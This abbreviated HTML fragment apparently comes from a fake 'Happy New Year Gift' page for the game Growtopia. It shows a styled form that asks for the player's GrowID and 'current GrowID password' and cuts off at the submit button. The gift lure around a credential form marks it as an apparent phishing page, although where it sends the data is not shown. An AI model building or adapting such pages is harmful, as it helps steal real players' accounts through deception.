<html>
<head>
<title>Happy New Year Gift - Growtopia</title>
	...
	<div class="titlebg" style="background-image:url(Pictures/grow_header.jpg); width:100%;">
        ...
        <div>
            	...
            	<div style="margin-left:5%;">
                    ...
                    <input class="form" type="text" name="user" placeholder="GrowID" style="font-size:18px; padding:8px; 
                    border-radius:5px; border:1px solid #CCC; outline:none;" required/><br/><br/>
                    
                    <font color="#333333"><b>Password (Your current GrowID password)</b> *</font><br/><br/>
                    <input class="form" type="password" name="password" placeholder="Password" style="font-size:18px; padding:8px; 
                    border-radius:5px; border:1px solid #CCC; outline:none;" required/><br/><br/><br/>
                     ...
                     <button type="submit"style="border:2px solid #FFF; background-color:transparent; color:#000; 
